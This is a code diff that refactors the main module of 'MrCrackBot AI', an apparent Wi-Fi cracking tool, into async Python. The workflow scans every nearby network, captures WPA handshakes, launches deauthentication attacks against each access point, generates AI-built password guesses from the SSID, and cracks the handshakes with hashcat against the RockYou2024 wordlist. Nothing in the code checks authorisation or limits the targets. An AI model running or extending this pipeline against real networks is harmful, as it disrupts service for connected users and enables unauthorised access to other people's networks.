@@ -1,124 +1,166 @@
-from network.scanner import scan_networks
-from network.handshake import capture_handshake
-from network.deauth import deauth_attack
-from cracking.wordlist_manager import WordlistManager
-from cracking.hashcat_wrapper import crack_password
+"""
+MrCrackBot AI - Main Module
+Handles core functionality and workflow management.
+"""
+
+import asyncio
+import logging
+from contextlib import asynccontextmanager
+from dataclasses import dataclass
+from pathlib import Path
+from typing import Dict, List
+
+import aiofiles
+
 from ai.feature_extractor import extract_features
 from ai.password_model import generate_password_guesses
-from ui.main_window import MainWindow
-from utils.config import ensure_directories, check_prerequisites, print_configuration
-
-# Import for the intro
+from cracking.hashcat_wrapper import crack_password
+from network.deauth import deauth_attack
+from network.handshake import capture_handshake
+from network.scanner import scan_networks
 from ui.intro import run_intro
+from ui.main_window import MainWindow
+from utils.config import Config
 
-# Additional imports for wordlist handling and file operations
-import os
-import logging
-
-# Set up logging
-logging.basicConfig(filename="mr_crackbot_ai.log", level=logging.INFO)
-
-
-def pre_gui_setup():
-    """
-    Perform all pre-GUI setup tasks, including printing configuration,
-    ensuring directories, and validating prerequisites.
-    """
-    print("[*] Initializing Mr. CrackBot AI...")
-
-    # Print configuration settings
-    print_configuration()
-
-    # Ensure directories exist
-    try:
-        ensure_directories()
-    except Exception as e:
-        print(f"[!] Failed to set up directories: {e}")
-        exit(1)
-
-    # Validate required tools
-    try:
-        check_prerequisites()
-    except RuntimeError as e:
-        print(f"[!] Missing prerequisites: {e}")
-        exit(1)
-
-    print("[*] Pre-GUI setup complete.")
+logging.basicConfig(
+    filename="mr_crackbot_ai.log",
+    level=logging.INFO,
+    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
+)
+logger = logging.getLogger(__name__)
 
 
-def use_combined_wordlist():
-    """
-    Ensure the combined RockYou2024 wordlist exists and return the path.
-    """
-    combined_wordlist = "data/wordlists/RockYou2024_combined.txt"
-    if not os.path.exists(combined_wordlist):
-        raise FileNotFoundError(
-            "[!] Combined wordlist not found. Run setup.py to generate it."
-        )
-    print(f"[*] Using combined wordlist: {combined_wordlist}")
-    return combined_wordlist
+@dataclass
+class NetworkTarget:
+    """Data class for storing network target information."""
+    ssid: str
+    bssid: str
+    channel: int
+    handshake_file: str = None
+    wordlist_file: str = None
 
 
-def main_workflow():
-    """
-    Perform the main workflow for scanning networks, capturing handshakes,
-    and cracking passwords.
-    """
-    # Step 1: Scan for networks
-    print("[*] Scanning for networks...")
-    networks = scan_networks()
+class CrackBotCore:
+    """Core class handling main application logic and operations."""
 
-    if not networks:
-        print("[!] No networks found.")
-        return
+    def __init__(self, config: Config) -> None:
+        self.config = config
+        self.progress_callback = None
+        self.retry_count = 3
+        self.retry_delay = 2
 
-    for network in networks:
-        ssid = network["ssid"]
-        bssid = network["bssid"]
-        channel = network["channel"]
-        print(f"[*] Targeting network: {ssid} ({bssid})")
+    async def update_progress(
+        self, stage: str, progress: float, message: str
+    ) -> None:
+        """Update progress information and log status."""
+        if self.progress_callback:
+            await self.progress_callback(stage, progress, message)
+        logger.info(f"{stage}: {message} ({progress}%)")
 
-        # Step 2: Capture handshake
-        handshake_file = capture_handshake(bssid, channel)
+    @asynccontextmanager
+    async def resource_manager(self, resource_type: str):
+        """Manage resource lifecycle and cleanup."""
+        try:
+            logger.info(f"Acquiring {resource_type} resources")
+            yield
+        finally:
+            logger.info(f"Cleaning up {resource_type} resources")
+            if resource_type == "temp_files":
+                await self.cleanup_temp_files()
 
-        # Step 3: Perform deauthentication attack
-        deauth_attack(bssid)
+    async def retry_operation(self, operation, *args):
+        """Execute operation with retry logic."""
+        for attempt in range(self.retry_count):
+            try:
+                return await operation(*args)
+            except Exception as e:
+                delay = self.retry_delay * (2 ** attempt)
+                logger.warning(f"Operation failed: {e}. Retrying in {delay}s...")
+                await asyncio.sleep(delay)
+        raise RuntimeError(f"Operation failed after {self.retry_count} attempts")
 
-        # Step 4: Extract network features
-        features = extract_features(ssid, bssid)
+    async def scan_networks_async(self) -> List[NetworkTarget]:
+        """Scan for available networks asynchronously."""
+        async with self.resource_manager("network_scan"):
+            networks = await self.retry_operation(scan_networks)
+            return [NetworkTarget(**network) for network in networks]
 
-        # Step 5: Generate wordlist with AI
-        print("[*] Generating AI-powered wordlist...")
+    async def process_network(self, target: NetworkTarget) -> None:
+        """Process individual network target."""
+        async with self.resource_manager("network_processing"):
+            target.handshake_file = await self.retry_operation(
+                capture_handshake, target.bssid, target.channel
+            )
+
+            await self.update_progress(
+                "deauth", 0, f"Starting deauth on {target.ssid}"
+            )
+            await self.retry_operation(deauth_attack, target.bssid)
+
+            features = await self.retry_operation(
+                extract_features, target.ssid, target.bssid
+            )
+
+            target.wordlist_file = await self.generate_wordlist(target, features)
+            await self.crack_password_async(target)
+
+    async def generate_wordlist(
+        self, target: NetworkTarget, features: Dict
+    ) -> str:
+        """Generate and save wordlist for target network."""
         metadata = {
-            "ssid": ssid,
-            "bssid": bssid,
-            "parameters": features
+            "ssid": target.ssid,
+            "bssid": target.bssid,
+            "parameters": features,
         }
-        wordlist = generate_password_guesses(metadata)
-        wordlist_file = "data/temp_wordlist.txt"
-        with open(wordlist_file, "w") as file:
-            file.write("\n".join(wordlist))
-        print(f"[*] Wordlist saved to {wordlist_file}")
 
-        # Step 6: Use combined RockYou wordlist for cracking
-        combined_wordlist = use_combined_wordlist()
-        crack_password(handshake_file, combined_wordlist)
+        wordlist = await self.retry_operation(generate_password_guesses, metadata)
+        wordlist_file = Path(self.config.temp_dir) / f"wordlist_{target.bssid}.txt"
+
+        async with aiofiles.open(wordlist_file, "w") as f:
+            await f.write("\n".join(wordlist))
+
+        return str(wordlist_file)
+
+    async def crack_password_async(self, target: NetworkTarget) -> None:
+        """Execute password cracking process."""
+        combined_wordlist = self.config.get_combined_wordlist_path()
+        await self.retry_operation(
+            crack_password,
+            target.handshake_file,
+            combined_wordlist,
+            progress_callback=self.update_progress,
+        )
+
+    async def cleanup_temp_files(self) -> None:
+        """Clean up temporary files."""
+        temp_dir = Path(self.config.temp_dir)
+        for file in temp_dir.glob("*"):
+            try:
+                file.unlink()
+            except Exception as e:
+                logger.error(f"Failed to cleanup {file}: {e}")
+
+
+async def main() -> None:
+    """Main application entry point."""
+    config = Config.load_from_file("config.yaml")
+    core = CrackBotCore(config)
+
+    run_intro()
+
+    try:
+        networks = await core.scan_networks_async()
+        for network in networks:
+            await core.process_network(network)
+    except Exception as e:
+        logger.error(f"Workflow error: {e}")
+    finally:
+        await core.cleanup_temp_files()
+
+    app = MainWindow(core)
+    await app.run_async()
 
 
 if __name__ == "__main__":
-    # Display the intro animation
-    run_intro()
-
-    # Pre-GUI setup
-    pre_gui_setup()
-
-    # Run the main workflow
-    main_workflow()
-
-    # Launch the GUI
-    print("[*] Launching GUI...")
-    app = MainWindow()
-    app.run()
-
-    # Post-GUI placeholder (if needed)
-    print("[*] Mr. CrackBot AI has exited.")
+    asyncio.run(main())
